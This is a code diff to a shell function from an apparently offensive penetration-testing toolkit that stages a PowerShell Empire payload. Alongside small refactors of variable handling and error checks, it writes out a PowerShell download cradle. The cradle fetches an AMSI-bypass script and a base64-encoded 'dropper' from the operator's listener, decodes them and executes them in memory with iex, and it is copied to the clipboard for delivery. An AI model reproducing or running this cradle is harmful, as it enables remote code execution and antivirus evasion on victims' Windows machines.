@@ -79,23 +79,28 @@ nb-srv-empire-stager() {
     nb-vars-set-lport
 
     # Path to generated Empire stager
+    local d
     __ask "Set the directory to Empire launcher.bat payload (without the filename)"
-    local d=$(__askpath DIR $HOME/downloads)
-    [[ "$d" == "~"* ]] && __err "~ not allowed, use the full path" && return
-    dp="${d}/launcher.bat"
+    d=$(__askpath DIR $HOME/downloads)
+
+    if [[ "$d" == "~"* ]]; then
+        echo "Error: ~ not allowed, use the full path."
+        return 1
+    fi
+
+    local dp="${d}/launcher.bat"
     
     # Encode the stager - grab the Base64 string out of the file and save it in a file called "dropper"
     cat "$dp" | grep enc | tr " " "\n" | egrep -e '\S{30}+' > "$HOME/desktop/server/dropper"
     __info "Stager \"dropper\" encoded."
 
     # Download the stager and bypass AV
-    __COMMAND="cat << "DOC" 
-
+    local __COMMAND
+    __COMMAND="cat <<DOC 
 iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/amsi.ps1)
 $a = iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/dropper
 $b = [System.Convert]::FromBase64String($a)
 iex([System.Text.Encoding]::Unicode.GetString($b))
-
 DOC"
 
     # Copy the commands to clipboard
